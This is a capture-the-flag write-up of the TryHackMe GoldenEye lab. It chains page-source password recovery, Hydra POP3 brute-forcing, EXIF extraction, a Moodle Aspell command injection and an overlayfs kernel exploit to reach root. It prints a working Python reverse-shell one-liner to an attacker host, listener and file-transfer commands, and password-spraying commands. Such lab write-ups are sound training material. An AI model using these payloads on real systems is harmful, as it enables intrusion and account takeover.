---
title: 'GoldenEye'
target: 'TryHackMe — GoldenEye'
difficulty: 'medium'
date: 2026-08-26
summary: 'A full Bond-themed boot2root: a password hidden in page source, POP3 enumeration over telnet, layered Hydra brute-forcing to pivot between users, an admin password buried in image EXIF, a manual Moodle Aspell reverse shell, and a kernel privesc to root.'
role: 'pentest'
tags: ['Boot2root', 'nmap', 'POP3', 'Hydra', 'exiftool', 'Moodle', 'Reverse shell', 'Kernel exploit', 'Privilege escalation']
problem: 'A themed boot2root with no starting credentials — the whole chain has to be built from a web page, several mail accounts, and a vulnerable training platform, ending at root.'
action: 'Enumerated services, recovered a password from page source, brute-forced POP3 accounts to pivot user-to-user, extracted an admin password from image EXIF, spawned a reverse shell through a Moodle plugin, and escalated with an overlayfs kernel exploit.'
outcome: 'A www-data foothold via Moodle, then root through the 37292 overlayfs exploit, and both flags.'
---

GoldenEye is a medium boot2root, and unlike the earlier rooms it doesn't hand you
a single exploit — it's a chain. A password in a web page leads to POP3, POP3
leads to more users, the users lead to a Moodle instance, Moodle leads to a shell,
and a stale kernel leads to root. Seven stages, each depending on the last.

Target set as an environment variable throughout:

```bash
export IP_ADDRESS=<target>
```

## Stage 1 — Enumeration

Two-phase nmap: fast full-port sweep first, then a detailed scan of only what's
open. Scanning all 65535 ports with scripts up front wastes time; splitting it is
faster.

```bash
sudo nmap -sV -Pn -n -p- -T aggressive $IP_ADDRESS
sudo nmap -sC -sV -Pn -n -p25,80,55006,55007 -T normal $IP_ADDRESS
```

![detailed nmap of the four open ports](/writeups/thm-goldeneye/01-nmap-detailed.png)

Four ports: **25** (SMTP, Postfix), **80** (HTTP, Apache 2.4.7), and POP3 on two
high non-default ports — **55006** (SSL/POP3) and **55007** (POP3), both Dovecot.
POP3 running on odd high ports is the tell: someone hid it there deliberately, so
that's where the interesting material will be.

## Stage 2 — The password in the source

The web root points at `/sev-home/`:

![the GoldenEye web page](/writeups/thm-goldeneye/02-web-sevhome.png)

`/sev-home/` needs credentials I don't have, so the next move is reading the page
source. In `terminal.js` there's a message to **boris** with an HTML-encoded
password embedded in the comments:

![terminal.js with the encoded password](/writeups/thm-goldeneye/03-terminaljs-source.png)

Decoding the HTML entities in CyberChef ("From HTML Entity") gives boris's
password in cleartext:

![CyberChef decoding the entity string](/writeups/thm-goldeneye/04-cyberchef-decode.png)

Those credentials work at the login prompt:

![logging into /sev-home/](/writeups/thm-goldeneye/05-sevhome-login.png)

And the page behind it confirms the direction — it explicitly says the POP3
service is on a high non-default port for "security by obscurity":

![the GoldenEye briefing page](/writeups/thm-goldeneye/06-goldeneye-page.png)

## Stage 3 — POP3 as boris

POP3 can be driven by hand over telnet. Port 55006 is wrapped in SSL, so 55007 is
the easier one to talk to plaintext:

```bash
telnet $IP_ADDRESS 55006   # SSL — awkward over plain telnet
telnet $IP_ADDRESS 55007   # plaintext POP3
```

![telnet to 55006](/writeups/thm-goldeneye/07-telnet-55006.png)
![telnet to 55007 banner](/writeups/thm-goldeneye/08-telnet-55007.png)

55007 answers with a POP3 banner but needs authentication, and boris's web
password doesn't work here. Brute-force it — starting with the small `fasttrack`
list rather than rockyou, since a short list is faster and often enough:

```bash
hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f $IP_ADDRESS -s 55007 pop3
```

![Hydra finding boris's POP3 password](/writeups/thm-goldeneye/09-hydra-boris.png)

With the password, authenticate over telnet and read the mailbox. The POP3 verbs:

```
USER boris
PASS <found>
LIST            # list messages
RETR 1          # retrieve message 1
QUIT
```

![boris POP3 login and message list](/writeups/thm-goldeneye/10-boris-pop3-list.png)
![boris message 1](/writeups/thm-goldeneye/11-boris-mail1.png)
![boris message 2 — natalya](/writeups/thm-goldeneye/12-boris-mail2.png)
![boris message 3 — Janus syndicate](/writeups/thm-goldeneye/13-boris-mail3.png)

The mail content isn't the prize — the **usernames** are. root, natalya, xenia,
janus, alec all appear. Any of them might reuse a weak POP3 password.

## Stage 4 — Pivot to natalya

Put the harvested names in a file and let Hydra spray all of them:

```bash
echo -e "natalya\njanus\nalec\nxenia\nroot" > usernames.txt
hydra -L usernames.txt -P /usr/share/wordlists/fasttrack.txt -f $IP_ADDRESS -s 55007 pop3
```

![usernames list](/writeups/thm-goldeneye/14-usernames-list.png)
![Hydra cracking natalya](/writeups/thm-goldeneye/15-hydra-natalya.png)

**natalya** falls. Read her mail the same way:

![natalya POP3 message list](/writeups/thm-goldeneye/16-natalya-pop3-list.png)
![natalya message 1](/writeups/thm-goldeneye/17-natalya-mail1.png)
![natalya message 2 — xenia creds and internal domain](/writeups/thm-goldeneye/18-natalya-mail2-xenia.png)

Her second message is the pivot: credentials for **xenia**, plus an internal
domain, `severnaya-station.com/gnocertdir`, that only resolves if you add it to
your hosts file. Point the name at the target IP:

```bash
sudo vim /etc/hosts
# add:  <target>   severnaya-station.com
```

![/etc/hosts edited](/writeups/thm-goldeneye/19-etc-hosts.png)

(If the box restarts and gets a new IP, this line has to be updated again.)

## Stage 5 — Moodle, and a password in EXIF

The internal domain is a **Moodle** instance:

![GoldenEye Moodle site](/writeups/thm-goldeneye/20-moodle-home.png)

Logging in as xenia, there's a message from **Dr Doak** revealing another mail
username, `doak`:

![Dr Doak's message to xenia](/writeups/thm-goldeneye/21-doak-message-xenia.png)

So it's back to Hydra for doak's POP3 password:

```bash
hydra -l doak -P /usr/share/wordlists/fasttrack.txt -f $IP_ADDRESS -s 55007 pop3
```

![Hydra cracking doak](/writeups/thm-goldeneye/22-hydra-doak.png)

doak's mail hands over his Moodle credentials:

![doak's mail with gnocertdir creds](/writeups/thm-goldeneye/23-doak-mail.png)

Logging into Moodle as doak, his private files hold `s3cret.txt`, which points at
an image at `/dir007key/for-007.jpg`. The image itself is nothing — but its EXIF
metadata isn't. `exiftool` shows a Base64 string in the Image Description field:

```bash
exiftool for-007.jpg
```

![exiftool showing the Base64 in Image Description](/writeups/thm-goldeneye/24-exiftool-for007.png)

Decoding that Base64 gives the **admin** password for Moodle. Metadata is a classic
hiding spot precisely because people look at the picture, not the fields behind it.

## Stage 6 — Moodle to a reverse shell

Logged in as Moodle admin, the version is 2.2.3, which has a known Aspell
command-injection path. Doing it manually rather than with Metasploit:

Set the spell engine to **PSpellShell** under Site administration → Plugins → Text
editors → TinyMCE HTML editor:

![setting spell engine to PSpellShell](/writeups/thm-goldeneye/25-moodle-spellengine.png)

The injection point is Site administration → Server → System paths, where the
"aspell" path field runs as a command. Start a listener first:

```bash
nc -lvnp 1234
```

Then place a reverse-shell payload in the path field and trigger it via the spell
checker (open a new blog entry, click the spell-check button):

```bash
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

The shell lands as **www-data**, upgraded to a proper TTY with the usual python
pty trick:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![reverse shell as www-data](/writeups/thm-goldeneye/26-reverse-shell-www-data.png)

## Stage 7 — Privilege escalation

Serve linpeas from the attack box (`python3 -m http.server` on the attacker) and
pull it down on the target:

```bash
curl 10.9.3.225/linpeas.sh > linpeas.sh
```

![transferring linpeas](/writeups/thm-goldeneye/27-linpeas-transfer.png)

linpeas flags the kernel: **3.13.0-32-generic**, Ubuntu 14.04 — old enough to be
vulnerable:

![linpeas kernel version](/writeups/thm-goldeneye/28-linpeas-kernel.png)

searchsploit maps that to the overlayfs local privesc:

```bash
searchsploit ubuntu 3.13
```

![searchsploit results](/writeups/thm-goldeneye/29-searchsploit.png)

`37292.c` is the one. One snag: it calls `gcc`, which isn't installed here — but
`cc` is. Edit the exploit's `system(...)` line to use `cc` instead:

![editing gcc to cc in the exploit](/writeups/thm-goldeneye/30-exploit-cc-edit.png)

Transfer it the same way, compile and run:

```bash
cc 37292.c -o root
./root
```

![root shell and flag](/writeups/thm-goldeneye/31-root-flag.png)

`whoami` returns **root**. The final flag sits as a hidden `.flag.txt` in `/root`,
and the flag was retrieved from there — with a pointer to a final `/006-final/`
directory to close the room out.

## What I took from this

GoldenEye is the first room here that's genuinely a *chain*, and the lesson is that
each artifact is a key to the next lock, not an end in itself. boris's mail wasn't
the goal — the usernames in it were. doak's private file wasn't the goal — the
image it named was, and the password was in the image's metadata, not the image.
Enumeration isn't one phase at the start; it repeats at every stage, and missing
one detail (the EXIF field, the hosts entry, the non-default port) stalls the
whole thing.

Two techniques worth keeping. Metadata as a hiding place — `exiftool` on every
image you find, because a picture that looks like a dead end often isn't. And
reading exploit code before running it: `37292.c` assumed `gcc`, the box only had
`cc`, and a one-word edit was the difference between it compiling and failing. An
exploit off exploit-db is a starting point you adapt to the target, not a button
you press.
